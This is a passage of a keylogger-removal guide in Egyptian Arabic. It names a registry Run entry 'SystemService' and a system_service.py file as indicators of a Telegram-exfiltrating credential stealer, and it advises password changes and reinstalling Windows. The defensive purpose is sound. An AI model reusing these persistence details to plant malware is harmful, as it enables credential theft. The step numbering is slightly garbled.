1. **اقطع النت فورًا**: عشان ما يبعتش بيانات زيادة.
2. **اسكَن الجهاز**: استخدم أنتي فيروس زي Windows Defender أو Malwarebytes عشان تلاقي الملفات الخبيثة.
3. **امسح الكيلوجر**:
   - افتح الريجستري (اكتب `regedit` في Run).
   - روح لـ `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.
   - لو لقيت حاجة إسمها "SystemService"، امسحها.
   - دور على ملف `system_service.py` في `C:\Users\إسمك\AppData\Roaming` وامسحه.
4. **غيّر الباسوردات**:
   - أي حساب دخلته من الجهاز ده (إيميل، بنك، فيسبوك)، غيّر باسورده من جهاز تاني.
   - استخدم باسوردات قوية (حروف، أرقام، رموز).
5. **بلّغ تيليجرام**:
   - لو عندك التوكن أو الشات آي دي ، ابعت بلاغ لتيليجرام إنهم بيستخدموه في حاجة غلط.
1. **اعمل فورمات لو مش متأكد**:
   - لو مش عارف تتأكد إن الكود اتشال، اعمل نسخة احتياطية للملفات المهمة واعمل تثبيت جديد للويندوز.
7. **استشر خبير**:
   - لو مش عارف تعمل الحاجات دي، خد الجهاز لحد بتاع كمبيوتر أو خبير أمن معلومات.

---

### نصيحة أخيرة
الكود ده زي واحد دخل بيتك، بيسرق حاجاتك، بيراقبك، وبيقدر يقفل الباب عليك. معمول بذكاء عشان يخدّعك ويخلّيك تحس إنه برنامج عادي، لكنه في الحقيقة بيدمّر خصوصيتك وأمانك. 😊
